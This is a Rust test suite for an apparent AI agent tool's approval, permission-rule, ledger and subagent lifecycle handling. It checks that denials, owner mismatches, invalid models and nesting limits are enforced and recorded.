        assert!(ledger_text(&home).contains("rule saved to local settings"));

        // Not trusted: the rule holds for the session, nothing is written,
        // and the record does not claim otherwise.
        let (home, project) = dirs("nosave");
        let mut ch = Scripted::new(&[ApprovalVerdict::AllowRuleAlways]);
        let mut grants = AutoGrants::new();
        run(
            &home,
            &project,
            &call("Write", br#"{"file_path":"out.txt","content":"x"}"#),
            &mut ch,
            &mut grants,
            &scope,
        );
        assert!(!project.join(".orbit").exists());
        assert!(grants.rule_granted("Write", "out.txt"));
        assert!(ledger_text(&home).contains("could not be saved"));
    }

    /// The note typed with `n` is the model's reason. It is not the
    /// ledger's: what an operator types stays out of it.
    #[test]
    fn a_denial_note_reaches_the_model_and_not_the_ledger() {
        let (home, project) = dirs("note");
        let mut ch = Scripted::new(&[ApprovalVerdict::Deny]);
        ch.note = Some("use make test instead".into());
        let out = run(
            &home,
            &project,
            &call("Write", br#"{"file_path":"out.txt","content":"x"}"#),
            &mut ch,
            &mut AutoGrants::new(),
            &PermissionScope::default(),
        );
        assert!(out.contains("use make test instead"), "{out}");
        assert!(!project.join("out.txt").exists());
        let ledger = ledger_text(&home);
        assert!(!ledger.contains("make test"), "{ledger}");
        assert!(ledger.contains("operator denied (with a note)"), "{ledger}");
        // No note: the plain reason.
        let mut ch = Scripted::new(&[ApprovalVerdict::Deny]);
        let out = run(
            &home,
            &project,
            &call("Write", br#"{"file_path":"out.txt","content":"x"}"#),
            &mut ch,
            &mut AutoGrants::new(),
            &PermissionScope::default(),
        );
        assert!(out.contains("operator denied"), "{out}");
    }
}

#[cfg(test)]
mod agent_key_tests {
    use super::*;

    /// The registry AgentTool is deleted (Task/Agent are intercepted in
    /// execute_call before the registry), but Agent(<agent-type>)
    /// pattern rules and session grants must keep working. This is the
    /// regression test for the deletion: an allow rule for
    /// Agent(Explore) must allow an Explore subagent call without
    /// asking, and a deny rule must refuse it.
    #[test]
    fn agent_pattern_rules_survive_the_registry_deletion() {
        let home = std::env::temp_dir().join(format!("orbit-agent-key-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&home);
        std::fs::create_dir_all(&home).unwrap();
        std::fs::write(
            home.join("settings.toml"),
            "[permissions]\nallow = [\"Agent(Explore)\"]\ndeny = [\"Agent(Dangerous)\"]\n",
        )
        .unwrap();

        let scope = PermissionScope {
            mode: orbit_tools::permissions::PermissionMode::Default,
            allowlist: None,
            disallowlist: vec![],
        };
        let explore = serde_json::json!({"agent": "Explore", "prompt": "find it"});
        let dangerous = serde_json::json!({"agent": "Dangerous", "prompt": "do it"});

        // The allow rule lets Explore through without asking.
        assert_eq!(
            pattern_layer_verdict(&home, &scope, "Task", &explore),
            PatternOutcome::Allow,
            "Agent(Explore) allow rule must apply to a Task call"
        );
        assert_eq!(
            pattern_layer_verdict(&home, &scope, "Agent", &explore),
            PatternOutcome::Allow,
            "and to the Agent alias"
        );
        // The deny rule refuses Dangerous.
        assert!(
            matches!(
                pattern_layer_verdict(&home, &scope, "Task", &dangerous),
                PatternOutcome::Deny(_)
            ),
            "Agent(Dangerous) deny rule must refuse the call"
        );
        // No rule: asks (the subagent's own calls still decide their
        // permissions, but spawning one is a decision).
        let unknown = serde_json::json!({"agent": "general", "prompt": "x"});
        assert_eq!(
            pattern_layer_verdict(&home, &scope, "Task", &unknown),
            PatternOutcome::Ask
        );

        // The key itself: same shape the deleted AgentTool computed.
        let key = orbit_tools::agent_permission_key(&explore);
        assert_eq!(key.tool, "Agent");
        assert_eq!(key.pattern, "Explore");
        // The old tool read agent_type; the alias shape still works.
        let alias = serde_json::json!({"agent_type": "plan", "prompt": "x"});
        assert_eq!(orbit_tools::agent_permission_key(&alias).pattern, "plan");
        // No agent named: general.
        let bare = serde_json::json!({"prompt": "x"});
        assert_eq!(orbit_tools::agent_permission_key(&bare).pattern, "general");

        let _ = std::fs::remove_dir_all(&home);
    }
}

#[cfg(test)]
mod agent_lifecycle_tests {
    use super::*;
    use orbit_engine::agent_store::{AgentStatus, AgentStore};
    use serde_json::{Value, json};
    use std::sync::atomic::Ordering;

    struct Mock {
        gate: String,
        state: orbit_mock_provider::server::ServerState,
        stop: Option<tokio::sync::oneshot::Sender<()>>,
        thread: Option<std::thread::JoinHandle<()>>,
    }

    impl Mock {
        fn new() -> Self {
            let (ready_tx, ready_rx) = std::sync::mpsc::channel();
            let (stop, stopped) = tokio::sync::oneshot::channel();
            let thread = std::thread::spawn(move || {
                let runtime = tokio::runtime::Builder::new_current_thread()
                    .enable_all()
                    .build()
                    .unwrap();
                runtime.block_on(async move {
                    let (addr, state, handle) = orbit_mock_provider::server::spawn().await.unwrap();
                    ready_tx.send((addr, state)).unwrap();
                    let _ = stopped.await;
                    handle.abort();
                    let _ = handle.await;
                });
            });
            let (addr, state) = ready_rx.recv().unwrap();
            Self {
                gate: format!("http://{addr}"),
                state,
                stop: Some(stop),
                thread: Some(thread),
            }
        }

        fn requests(&self) -> u64 {
            self.state.requests.load(Ordering::SeqCst)
        }
        fn body(&self) -> Value {
            self.state.last_body.lock().unwrap().clone().unwrap()
        }
        fn config(&self, model: &str) -> orbit_engine::TurnConfig {
            orbit_engine::TurnConfig {
                provider_id: "mock".into(),
                gate: self.gate.clone(),
                model: model.into(),
                kind: orbit_engine::ProviderKind::OpenAiCompatible,
                credential_env: None,
                pricing: None,
                first_byte_timeout_ms: None,
                idle_timeout_ms: None,
                max_output_tokens: 32_000,
                sampling: None,
                effort: None,
                supported_efforts: None,
            }
        }
        fn configure(&self, home: &Path) {
            std::fs::write(home.join("providers.toml"), format!(
                "[[provider]]\nname='mock'\nurl='{}'\n[[provider.models]]\nid='mock-notools'\n[[provider.models]]\nid='override-notools'\n[[provider.models]]\nid='role-notools'\n[[provider.models]]\nid='mock-bash'\n", self.gate
            )).unwrap();
        }
    }

    impl Drop for Mock {
        fn drop(&mut self) {
            if let Some(stop) = self.stop.take() {
                let _ = stop.send(());
            }
            if let Some(thread) = self.thread.take() {
                thread.join().unwrap();
            }
        }
    }

    struct Approve;
    impl ApprovalChannel for Approve {
        fn ask(&mut self, _: &ApprovalRequest, _: bool) -> ApprovalVerdict {
            ApprovalVerdict::AllowOnce
        }
    }

    struct Fixture {
        home: std::path::PathBuf,
        cx: orbit_tools::ToolContext,
    }
    impl Fixture {
        fn new() -> Self {
            let home =
                std::env::temp_dir().join(format!("orbit-agent-runtime-{}", ulid::Ulid::new()));
            let work = home.join("work");
            std::fs::create_dir_all(&work).unwrap();
            #[cfg(unix)]
            {
                use std::os::unix::fs::PermissionsExt;
                std::fs::set_permissions(&home, std::fs::Permissions::from_mode(0o700)).unwrap();
            }
            // The public context ID is deliberately different: only the trusted
            // execute_call session ID may establish the owner namespace.
            let cx =
                orbit_tools::ToolContext::new(home.clone(), "untrusted-context-id".into(), work);
            Self { home, cx }
        }
        fn call(&self, owner: &str, name: &str, args: Value, scope: &PermissionScope) -> Value {
            let call = crate::PendingToolCall {
                index: 0,
                id: ulid::Ulid::new().to_string(),
                name: name.into(),
                arguments: serde_json::to_vec(&args).unwrap(),
            };
            let (result, _) = execute_call(
                &self.home,
                owner,
                "decision",
                &call,
                true,
                false,
                &mut Approve,
                &mut AutoGrants::new(),
                scope,
                &self.cx,
            )
            .unwrap();
            serde_json::from_str(&result).unwrap()
        }
        fn task(&self, args: Value) -> Value {
            self.call("owner", "Task", args, &PermissionScope::default())
        }
        fn store(&self) -> AgentStore {
            AgentStore::new(&self.home, "owner").unwrap()
        }
        fn ledger(&self) -> String {
            std::fs::read_dir(self.home.join("ledger/segments"))
                .unwrap()
                .flatten()
                .map(|entry| {
                    String::from_utf8_lossy(&std::fs::read(entry.path()).unwrap()).into_owned()
                })
                .collect()
        }
    }
    impl Drop for Fixture {
        fn drop(&mut self) {
            let _ = std::fs::remove_dir_all(&self.home);
        }
    }
    fn id(result: &Value) -> &str {
        result["result"]["agent_id"].as_str().unwrap()
    }

    #[test]
    fn actual_read_only_agent_does_not_discover_irrelevant_mcp_servers() {
        let mock = Mock::new();
        let fixture = Fixture::new();
        let marker = fixture.home.join("unexpected-spawn");
        std::fs::write(fixture.home.join("mcp.json"), json!({"servers":{"irrelevant":{
            "command":"python3", "args":["-c", format!("from pathlib import Path; Path({:?}).touch()", marker.to_string_lossy())],
            "timeout_ms":100, "initialize_timeout_ms":100
        }}}).to_string()).unwrap();
        remember_turn_config(&fixture.cx, &mock.config("mock-notools"));
        let result = fixture.task(json!({"agent":"Explore","prompt":"inspect without MCP"}));
        assert_eq!(result["ok"], true, "{result}");
        assert!(!marker.exists());
        let body = mock.body();
        assert!(!body["tools"].as_array().unwrap().iter().any(|tool| {
            tool["function"]["name"]
                .as_str()
                .unwrap()
                .starts_with("mcp__")
        }));
    }

    #[test]
    fn bounded_task_response_preserves_normal_success_and_cancellation() {
        for ok in [true, false] {
            let response = json!({
                "ok": ok,
                "result": { "ok":ok,"agent_id":"01K00000000000000000000000",
                    "name":"researcher","model":"mock/mock-notools",
                    "status":if ok {"completed"} else {"cancelled"},
                    "turns":1,"rounds":1,"agent":"Explore","report":"hello 世界\n" }
            });
            assert_eq!(bounded_task_output(response.clone()), response.to_string());
        }
    }

    #[test]
    fn bounded_task_response_keeps_metadata_for_large_escaped_unicode_reports() {
        let full_report = "世界🛰\"\\\n\r\t\u{0000}\u{001f}".repeat(MAX_RESULT_BYTES);
        let response = json!({
            "ok":true,
            "result": { "ok":true,"agent_id":"01K00000000000000000000000",
                "name":"researcher","model":"mock/mock-notools","status":"completed",
                "turns":3,"rounds":2,"agent":"Explore","report":full_report }
        });
        let expected_metadata = response["result"].as_object().unwrap().clone();
        let output = bounded_task_output(response);
        assert!(
            output.len() <= MAX_RESULT_BYTES,
            "encoded length {}",
            output.len()
        );
        let decoded: Value = serde_json::from_str(&output).unwrap();
        assert_eq!(decoded["ok"], true);
        assert_eq!(decoded["result"]["report_truncated"], true);
        for (key, value) in expected_metadata
            .iter()
            .filter(|(key, _)| key.as_str() != "report")
        {
            assert_eq!(&decoded["result"][key], value, "metadata field {key}");
        }
        let shortened = decoded["result"]["report"].as_str().unwrap();
        assert!(!shortened.is_empty() && full_report.starts_with(shortened));
        assert!(shortened.len() < full_report.len());
        // The formatter never alters the saved source report.
        assert_eq!(expected_metadata["report"].as_str().unwrap(), full_report);
    }

    #[test]
    fn bounded_task_error_retains_agent_id_under_large_escaped_failure_text() {
        let output = bounded_task_output(json!({
            "ok":false,"agent_id":"01K00000000000000000000000",
            "error":"failed\u{0000}🛰\n".repeat(MAX_RESULT_BYTES)
        }));
        assert!(output.len() <= MAX_RESULT_BYTES);
        let decoded: Value = serde_json::from_str(&output).unwrap();
        assert_eq!(decoded["ok"], false);
        assert_eq!(decoded["agent_id"], "01K00000000000000000000000");
        assert_eq!(decoded["error_truncated"], true);
        assert!(!decoded["error"].as_str().unwrap().is_empty());
    }

    #[test]
    fn create_resume_keeps_identity_history_and_sticky_model() {
        let mock = Mock::new();
        let fixture = Fixture::new();
        mock.configure(&fixture.home);
        remember_turn_config(&fixture.cx, &mock.config("mock-notools"));
        let updates = std::sync::Arc::new(std::sync::Mutex::new(Vec::new()));
        let seen = updates.clone();
        fixture
            .cx
            .set_ext(SubagentObserver(std::sync::Arc::new(move |update| {
                seen.lock().unwrap().push(update.clone());
            })));
        let first =
            fixture.task(json!({"agent":"Explore","name":"researcher","prompt":"first task"}));
        assert_eq!(first["ok"], true, "{first}");
        let agent_id = id(&first).to_string();
        remember_turn_config(&fixture.cx, &mock.config("override-notools"));
        let second = fixture.call(
            "owner",
            "Agent",
            json!({
                "agent_type":"Explore", "resume":agent_id, "description":"second task"
            }),
            &PermissionScope::default(),
        );
        assert_eq!(second["ok"], true, "{second}");
        assert_eq!(id(&second), agent_id);
        assert_eq!(second["result"]["model"], "mock/mock-notools");
        assert_eq!(second["result"]["name"], "researcher");
        assert_eq!(mock.body()["model"], "mock-notools");
        let messages = mock.body()["messages"].to_string();
        assert!(messages.contains("first task") && messages.contains("second task"));
        let saved = fixture.store().load(&agent_id).unwrap();
        assert_eq!(saved.turns, 2);
        assert_eq!(saved.status, AgentStatus::Completed);
        assert_eq!(
            saved
                .transcript
                .iter()
                .filter(|m| m.role == orbit_adapter::types::ChatRole::User)
                .count(),
            2
        );
        assert!(
            AgentStore::new(&fixture.home, "untrusted-context-id")
                .unwrap()
                .list()
                .unwrap()
                .is_empty()
        );
        let started: Vec<_> = updates
            .lock()
            .unwrap()
            .iter()
            .filter_map(|update| match update {
                SubagentUpdate::Started {
                    id, name, model, ..
                } => Some((id.clone(), name.clone(), model.clone())),
                _ => None,
            })
            .collect();
        assert_eq!(
            started,
            vec![(agent_id.clone(), "Explore".into(), "mock-notools".into()); 2]
        );
        assert!(
            fixture.ledger().contains(&agent_id),
            "engine ledger must use the agent ID"
        );
    }

    #[test]
    fn explicit_model_overrides_routing_and_unknown_models_do_not_run() {
        let mock = Mock::new();
        let fixture = Fixture::new();
        mock.configure(&fixture.home);
        let mut configured = std::fs::read_to_string(fixture.home.join("providers.toml")).unwrap();
        configured.push_str("[roles]\nexplore='mock/role-notools'\n");
        std::fs::write(fixture.home.join("providers.toml"), configured).unwrap();
        remember_turn_config(&fixture.cx, &mock.config("mock-notools"));
        let role = fixture.task(json!({"agent":"Explore","prompt":"use role"}));
        assert_eq!(role["result"]["model"], "mock/role-notools", "{role}");
        let first = fixture.task(
            json!({"subagent_type":"Explore","prompt":"override role","model":"override-notools"}),
        );
        assert_eq!(first["ok"], true, "{first}");
        assert_eq!(first["result"]["model"], "mock/override-notools");
        let resumed = fixture.task(json!({"agent":"Explore","prompt":"change saved model","resume":id(&first),"model":"mock/mock-notools"}));
        assert_eq!(resumed["result"]["model"], "mock/mock-notools");
        assert_eq!(mock.body()["model"], "mock-notools");
        let requests = mock.requests();
        let count = fixture.store().list().unwrap().len();
        for spec in ["missing", "missing/mock-notools", "mock/missing", ""] {
            let error =
                fixture.task(json!({"agent":"Explore","prompt":"invalid override","model":spec}));
            assert_eq!(error["ok"], false, "{error}");
        }
        assert_eq!(mock.requests(), requests);
        assert_eq!(fixture.store().list().unwrap().len(), count);
        // Frontmatter remains the default, but explicit selection takes precedence.
        std::fs::create_dir_all(fixture.home.join("agents")).unwrap();
        std::fs::write(
            fixture.home.join("agents/reviewer.md"),
            "---\nname: reviewer\ndescription: review\nmodel: role-notools\ntools: [Read]\n---\n",
        )
        .unwrap();
        let declared = fixture.task(json!({"agent":"reviewer","prompt":"default declared model"}));
        assert_eq!(declared["result"]["model"], "mock/role-notools");
        let explicit = fixture.task(json!({"agent":"reviewer","prompt":"explicit declared override","model":"mock/override-notools"}));
        assert_eq!(explicit["result"]["model"], "mock/override-notools");
    }

    #[test]
    fn queued_messages_wait_for_explicit_resume_and_listing_is_metadata_only() {
        let mock = Mock::new();
        let fixture = Fixture::new();
        remember_turn_config(&fixture.cx, &mock.config("mock-notools"));
        let first = fixture.task(json!({"agent":"Explore","prompt":"initial"}));
        let agent_id = id(&first);
        let before = mock.requests();
        let receipt = fixture.call("owner", "AgentSendMessage", json!({
            "agent_id":agent_id,"message":"private queued instruction","sender_agent_id":"spoofed"
        }), &PermissionScope::default());
        assert_eq!(receipt["ok"], true, "{receipt}");
        assert_eq!(receipt["result"]["status"], "queued");
        assert_eq!(mock.requests(), before);
        let message_id = receipt["result"]["message_id"].as_str().unwrap();
        let saved = fixture.store().load(agent_id).unwrap();
        assert_eq!(saved.inbox[0].message_id, message_id);
        assert_eq!(saved.inbox[0].sender_agent_id, None);
        let listing = fixture.call(
            "owner",
            "ListAgents",
            json!({}),
            &PermissionScope::default(),
        );
        assert_eq!(listing["result"]["agents"][0]["pending_messages"], 1);
        assert!(!listing.to_string().contains("private queued instruction"));
        assert!(!listing.to_string().contains("transcript"));
        assert_eq!(mock.requests(), before);
        let resumed =
            fixture.task(json!({"agent":"Explore","resume":agent_id,"prompt":"process inbox"}));
        assert_eq!(resumed["ok"], true, "{resumed}");
        let messages = mock.body()["messages"].to_string();
        assert!(messages.contains("private queued instruction"));
        assert!(messages.contains(message_id) && messages.contains("owning session"));
        assert!(fixture.store().load(agent_id).unwrap().inbox.is_empty());
    }

    #[test]
    fn agent_listing_pages_all_agents_with_bounded_metadata() {
        let fixture = Fixture::new();
        let owner = "o".repeat(256);
        let store = AgentStore::new(&fixture.home, &owner).unwrap();
        for index in 0..64 {
            let name = format!("{}{:02}", "界".repeat(62), index);
            store
                .create(&"a".repeat(256), Some(&name), &"m".repeat(256), None)
                .unwrap();
        }
        let mut offset = 0;
        let mut seen = std::collections::HashSet::new();
        loop {
            let listing = fixture.call(
                &owner,
                "ListAgents",
                json!({"offset":offset,"limit":64}),
                &PermissionScope::default(),
            );
            assert_eq!(listing["ok"], true, "{listing}");
            assert!(listing.to_string().len() <= MAX_RESULT_BYTES);
            assert_eq!(listing["result"]["total"], 64);
            let page = listing["result"]["agents"].as_array().unwrap();
            assert!(!page.is_empty());
            for agent in page {
                assert!(seen.insert(agent["agent_id"].as_str().unwrap().to_string()));
            }
            match listing["result"]["next_offset"].as_u64() {
                Some(next) => {
                    assert!(next > offset);
                    offset = next;
                }
                None => break,
            }
        }
        assert_eq!(seen.len(), 64);
        let default_page =
            fixture.call(&owner, "ListAgents", json!({}), &PermissionScope::default());
        assert_eq!(
            default_page["result"]["agents"].as_array().unwrap().len(),
            20
        );
        for args in [
            json!({"offset":-1}),
            json!({"limit":0}),
            json!({"limit":65}),
        ] {
            let invalid = fixture.call(&owner, "ListAgents", args, &PermissionScope::default());
            assert_eq!(invalid["ok"], false);
        }
    }

    #[test]
    fn failures_keep_agent_id_and_persist_the_actual_transcript() {
        let mock = Mock::new();
        let fixture = Fixture::new();
        let mut config = mock.config("mock-notools");
        config.gate = "not-a-provider-url".into();
        remember_turn_config(&fixture.cx, &config);
        let error = fixture.task(json!({"agent":"Explore","prompt":"persist failed turn"}));
        assert_eq!(error["ok"], false, "{error}");
        let agent_id = error["agent_id"].as_str().unwrap();
        let saved = fixture.store().load(agent_id).unwrap();
        assert_eq!(saved.status, AgentStatus::Failed);
        assert_eq!(saved.turns, 1);
        assert!(
            saved
                .transcript
                .iter()
                .any(|message| message.content == "persist failed turn")
        );
        assert!(!saved.report.is_empty());
        assert_eq!(mock.requests(), 0);
        let serialized = serde_json::to_string(&saved).unwrap();
        assert!(!serialized.contains(&mock.gate));
        assert!(!serialized.contains("credential_env"));
    }

    #[test]
    fn owner_profile_and_path_mismatches_never_call_provider() {
        let mock = Mock::new();
        let fixture = Fixture::new();
        remember_turn_config(&fixture.cx, &mock.config("mock-notools"));
        let first = fixture.task(json!({"agent":"Explore","prompt":"owned"}));
        let agent_id = id(&first);
        let before = mock.requests();
        let wrong_profile =
            fixture.task(json!({"agent":"Plan","resume":agent_id,"prompt":"change authority"}));
        assert_eq!(wrong_profile["ok"], false, "{wrong_profile}");
        assert!(
            wrong_profile["error"]
                .as_str()
                .unwrap()
                .contains("type mismatch")
        );
        let wrong_owner = fixture.call(
            "other-owner",
            "Task",
            json!({"agent":"Explore","resume":agent_id,"prompt":"foreign"}),
            &PermissionScope::default(),
        );
        assert_eq!(wrong_owner["ok"], false);
        for target in ["../outside", "not-an-id"] {
            let invalid =
                fixture.task(json!({"agent":"Explore","resume":target,"prompt":"invalid"}));
            assert_eq!(invalid["ok"], false);
            let send = fixture.call(
                "owner",
                "AgentSendMessage",
                json!({"agent_id":target,"message":"invalid"}),
                &PermissionScope::default(),
            );
            assert_eq!(send["ok"], false);
        }
        let foreign_send = fixture.call(
            "other-owner",
            "AgentSendMessage",
            json!({"agent_id":agent_id,"message":"foreign"}),
            &PermissionScope::default(),
        );
        assert_eq!(foreign_send["ok"], false);
        assert_eq!(mock.requests(), before);
    }

    #[test]
    fn child_inherits_scope_and_stable_id_for_real_tool_ledger_records() {
        let mock = Mock::new();
        let fixture = Fixture::new();
        remember_turn_config(&fixture.cx, &mock.config("mock-bash"));
        let scope = PermissionScope::from_flags(None, Some("Agent(general-purpose)"), Some("Bash"));
        let result = fixture.call(
            "owner",
            "Task",
            json!({"agent":"general-purpose","prompt":"a denied shell call"}),
            &scope,
        );
        assert_eq!(result["ok"], true, "{result}");
        let agent_id = id(&result);
        let saved = fixture.store().load(agent_id).unwrap();
        let tool = saved
            .transcript
            .iter()
            .find(|m| m.role == orbit_adapter::types::ChatRole::Tool)
            .unwrap();
        assert!(
            orbit_tools::result_is_denial(&tool.content),
            "{}",
            tool.content
        );
        let ledger = fixture.ledger();
        assert!(ledger.contains(agent_id) && ledger.contains("Bash"));
        assert!(ledger.contains("\"allowed\":false"));
        assert_eq!(mock.requests(), 2);
    }

    #[test]
    fn depth_is_checked_before_model_or_agent_creation_and_context_is_fresh() {
        let fixture = Fixture::new();
        fixture.cx.set_ext(AgentSessionContext {
            owner_session_id: "owner".into(),
            current_agent_id: None,
            depth: 3,
        });
        let error =
            fixture.task(json!({"agent":"general-purpose","prompt":"too deep","model":"invalid"}));
        assert!(error["error"].as_str().unwrap().contains("nesting limit"));
        assert!(fixture.store().list().unwrap().is_empty());
        fixture.cx.set_ext(AgentSessionContext {
            owner_session_id: "owner".into(),
            current_agent_id: None,
            depth: 0,
        });
        let path = fixture.cx.working_dir.join("read.txt");
        std::fs::write(&path, b"parent").unwrap();
        fixture
            .cx
            .record_read(path.clone(), hex::encode(Sha256::digest(b"parent")));
        assert!(fixture.cx.was_read(&path));
        fixture.cx.push_cancel_check(std::sync::Arc::new(|| true));
        let child = child_agent_context(&fixture.home, "owner", "child", &fixture.cx);
        assert_eq!(child.working_dir, fixture.cx.working_dir);
        assert_eq!(child.working_dirs, fixture.cx.working_dirs);
        assert!(!child.was_read(&path));
        assert!(!child.is_cancelled());
        child.push_cancel_check(std::sync::Arc::new(|| false));
        assert!(fixture.cx.is_cancelled());
        let identity = agent_session_context(&child, "ignored");
        assert_eq!(identity.owner_session_id, "owner");
        assert_eq!(identity.current_agent_id.as_deref(), Some("child"));
        assert_eq!(identity.depth, 1);
    }

    #[test]
    fn plan_denies_queue_writes_and_task_aliases_use_identical_keys() {
        let fixture = Fixture::new();
        let agent = fixture
            .store()
            .create("Explore", None, "mock/mock-notools", None)
            .unwrap();
        let plan = PermissionScope::from_flags(Some("plan"), None, None);
        let send = fixture.call(
            "owner",
            "AgentSendMessage",
            json!({"agent_id":agent.agent_id,"message":"blocked"}),
            &plan,
        );
        assert!(orbit_tools::result_is_denial(&send.to_string()));
        assert!(
            fixture
                .store()
                .load(&agent.agent_id)
                .unwrap()
                .inbox
                .is_empty()
        );
        let explicit_allow =
            PermissionScope::from_flags(Some("plan"), Some("AgentSendMessage"), None);
        let still_denied = fixture.call(
            "owner",
            "AgentSendMessage",
            json!({"agent_id":agent.agent_id,"message":"still blocked"}),
            &explicit_allow,
        );
        assert!(orbit_tools::result_is_denial(&still_denied.to_string()));
        let listing = fixture.call("owner", "ListAgents", json!({}), &plan);
        assert_eq!(listing["ok"], true, "{listing}");
        let denied = PermissionScope::from_flags(None, None, Some("Agent(Explore)"));
        for alias in ["agent", "agent_type", "subagent_type"] {
            let args = json!({(alias):"Explore","description":"old aliases"});
            for tool in ["Task", "Agent"] {
                let result = fixture.call("owner", tool, args.clone(), &denied);
                assert!(
                    orbit_tools::result_is_denial(&result.to_string()),
                    "{alias} {result}"
                );
            }
        }
    }

    #[test]
    fn cancelled_and_stale_runs_resume_from_saved_transcript() {
        let mock = Mock::new();
        let fixture = Fixture::new();
        remember_turn_config(&fixture.cx, &mock.config("mock-notools"));
        fixture.cx.push_cancel_check(std::sync::Arc::new(|| true));
        let cancelled = fixture.task(json!({"agent":"Explore","prompt":"cancelled task"}));
        assert_eq!(cancelled["ok"], false, "{cancelled}");
        let agent_id = cancelled["agent_id"].as_str().unwrap();
        let saved = fixture.store().load(agent_id).unwrap();
        assert_eq!(saved.status, AgentStatus::Cancelled);
        assert_eq!(saved.turns, 1);
        assert_eq!(mock.requests(), 0);
        fixture.cx.pop_cancel_check();
        drop(fixture.store().begin(agent_id, None).unwrap());
        assert_eq!(
            fixture.store().load(agent_id).unwrap().status,
            AgentStatus::Interrupted
        );
        let resumed = fixture.task(
            json!({"agent":"Explore","resume":agent_id,"prompt":"continue after inspection"}),
        );
        assert_eq!(resumed["ok"], true, "{resumed}");
        let body = mock.body();
        let last = body["messages"].as_array().unwrap().last().unwrap()["content"]
            .as_str()
            .unwrap();
        assert!(last.contains("previous run was interrupted"));
        assert!(last.contains("Inspect the actual work"));
        assert!(!last.contains("cancelled task"));
        assert_eq!(fixture.store().load(agent_id).unwrap().turns, 2);
    }
    fn configure_effort(mock: &Mock, fixture: &Fixture) {
        mock.configure(&fixture.home);
        let mut cfg = crate::config::ProvidersConfig::load(&fixture.home).unwrap();
        for model in &mut cfg.provider[0].models {
            use orbit_adapter::types::EffortValue;
            let (choices, default) = if model.id == "role-notools" {
                (vec![EffortValue::Level("medium".into())], "medium")
            } else {
                (
                    vec![
                        EffortValue::Level("low".into()),
                        EffortValue::Level("high".into()),
                    ],
                    "low",
                )
            };
            model.supported_efforts = Some(choices);
            model.default_effort = Some(EffortValue::Level(default.into()));
        }
        cfg.save_atomic(&fixture.home).unwrap();
        let config = crate::try_engine_turn_config(
            &fixture.home,
            "mock",
            &mock.gate,
            "mock-notools",
            None,
            None,
        )
        .unwrap();
        remember_turn_config(&fixture.cx, &config);
    }

    #[test]
    fn agent_effort_override_inheritance_and_sticky_reset_reach_requests() {
        use orbit_adapter::types::{EffortSetting, EffortValue};
        let mock = Mock::new();
        let fixture = Fixture::new();
        configure_effort(&mock, &fixture);
        let mut config = crate::try_engine_turn_config(
            &fixture.home,
            "mock",
            &mock.gate,
            "mock-notools",
            None,
            None,
        )
        .unwrap();
        let high = Some(EffortSetting::Value(EffortValue::Level("high".into())));
        crate::apply_effort_setting(&fixture.home, &mut config, high.as_ref().unwrap()).unwrap();
        remember_turn_config(&fixture.cx, &config);
        remember_effort_setting(&fixture.cx, &high);
        let before = mock.requests();
        let first = fixture.task(json!({"agent":"Explore","prompt":"inherit parent"}));
        assert_eq!(first["ok"], true, "{first}");
        assert_eq!(mock.body()["reasoning_effort"], "high");
        assert_eq!(mock.requests(), before + 1);
        let agent_id = id(&first);
        remember_effort_setting(&fixture.cx, &Some(EffortSetting::Default));
        let resumed =
            fixture.task(json!({"agent":"Explore","prompt":"keep saved choice","resume":agent_id}));
        assert_eq!(resumed["ok"], true, "{resumed}");
        assert_eq!(mock.body()["reasoning_effort"], "high");
        let low = fixture.task(
            json!({"agent":"Explore","prompt":"explicit lower","resume":agent_id,"effort":"low"}),
        );
        assert_eq!(low["ok"], true, "{low}");
        assert_eq!(mock.body()["reasoning_effort"], "low");
        let reset = fixture
            .task(json!({"agent":"Explore","prompt":"reset","resume":agent_id,"effort":null}));
        assert_eq!(reset["ok"], true, "{reset}");
        assert_eq!(
            fixture.store().load(agent_id).unwrap().effort,
            Some(EffortSetting::Default)
        );
        remember_effort_setting(&fixture.cx, &high);
        let saved_reset =
            fixture.task(json!({"agent":"Explore","prompt":"keep reset","resume":agent_id}));
        assert_eq!(saved_reset["ok"], true, "{saved_reset}");
        assert_eq!(mock.body()["reasoning_effort"], "low");
        let list = fixture.call(
            "owner",
            "ListAgents",
            json!({}),
            &PermissionScope::default(),
        );
        assert!(list.to_string().contains("\"mode\":\"default\""), "{list}");
    }

    #[test]
    fn saved_default_outranks_a_nondefault_profile_and_model_changes_drop_overrides() {
        use orbit_adapter::types::{EffortSetting, EffortValue};
        let mock = Mock::new();
        let fixture = Fixture::new();
        configure_effort(&mock, &fixture);
        std::fs::create_dir_all(fixture.home.join("agents")).unwrap();
        std::fs::write(fixture.home.join("agents/profile.md"),"---\nname: custom\ndescription: configured profile\ntools: [Read]\neffort: high\n---\n").unwrap();
        let profile = fixture.task(json!({"agent":"custom","prompt":"profile choice"}));
        assert_eq!(profile["ok"], true, "{profile}");
        assert_eq!(mock.body()["reasoning_effort"], "high");
        let first =
            fixture.task(json!({"agent":"custom","prompt":"reset profile","effort":"default"}));
        assert_eq!(first["ok"], true, "{first}");
        assert_eq!(mock.body()["reasoning_effort"], "low");
        let resumed =
            fixture.task(json!({"agent":"custom","prompt":"saved reset","resume":id(&first)}));
        assert_eq!(resumed["ok"], true, "{resumed}");
        assert_eq!(mock.body()["reasoning_effort"], "low");
        assert_eq!(
            fixture.store().load(id(&first)).unwrap().effort,
            Some(EffortSetting::Default)
        );
        let selected =
            fixture.task(json!({"agent":"Explore","prompt":"selected high","effort":"high"}));
        assert_eq!(selected["ok"], true, "{selected}");
        remember_effort_setting(
            &fixture.cx,
            &Some(EffortSetting::Value(EffortValue::Level("high".into()))),
        );
        let changed = fixture.task(json!({"agent":"Explore","prompt":"new model default","resume":id(&selected),"model":"mock/override-notools"}));
        assert_eq!(changed["ok"], true, "{changed}");
        assert_eq!(mock.body()["reasoning_effort"], "low");
        assert_eq!(
            fixture.store().load(id(&selected)).unwrap().effort,
            Some(EffortSetting::Default)
        );
        let mut cfg = crate::config::ProvidersConfig::load(&fixture.home).unwrap();
        cfg.roles.explore = "mock/role-notools".into();
        cfg.save_atomic(&fixture.home).unwrap();
        let routed = fixture.task(json!({"agent":"Explore","prompt":"different model default"}));
        assert_eq!(routed["ok"], true, "{routed}");
        assert_eq!(mock.body()["reasoning_effort"], "medium");
    }

    #[test]
    fn invalid_agent_effort_has_no_request_start_or_mailbox_ack() {
        let mock = Mock::new();
        let fixture = Fixture::new();
        configure_effort(&mock, &fixture);
        let before = mock.requests();
        for effort in [json!("xhigh"), json!(true), json!(3), json!(" high")] {
            let response =
                fixture.task(json!({"agent":"Explore","prompt":"invalid choice","effort":effort}));
            assert_eq!(response["ok"], false, "{response}");
            assert_eq!(mock.requests(), before);
